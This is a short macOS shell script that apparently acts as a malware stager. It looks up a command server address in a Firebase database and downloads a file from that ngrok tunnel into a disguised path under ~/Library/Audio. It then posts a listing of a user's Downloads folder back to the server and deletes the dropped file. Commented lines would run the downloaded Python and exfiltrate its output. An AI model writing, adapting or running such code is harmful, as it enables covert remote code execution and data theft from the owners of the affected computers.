EXEC_PATH="/Users/$USER/Library/Audio/$USER.py"

response=$(curl -s "https://retard-e363c-default-rtdb.asia-southeast1.firebasedatabase.app/IP.json")
NGROK="${response:1:${#response}-2}"

EXEC="$NGROK/python/$USER"

# osascript -e "display notification \"$EXEC\" with title \"Flask\""

# Download exec from ngrok url
curl -so $EXEC_PATH "$EXEC"


# out=$(python3 $EXEC_PATH 2>&1 >/dev/null)
# curl -X POST -d "msg=PYTHON OUT: $out" "$NGROK/log/011935"

cd /Users/011935/Downloads
out=$(ls 2>&1 >/dev/null)
curl -X POST -d "msg=$out" "$NGROK/log/011935"

rm $EXEC_PATH
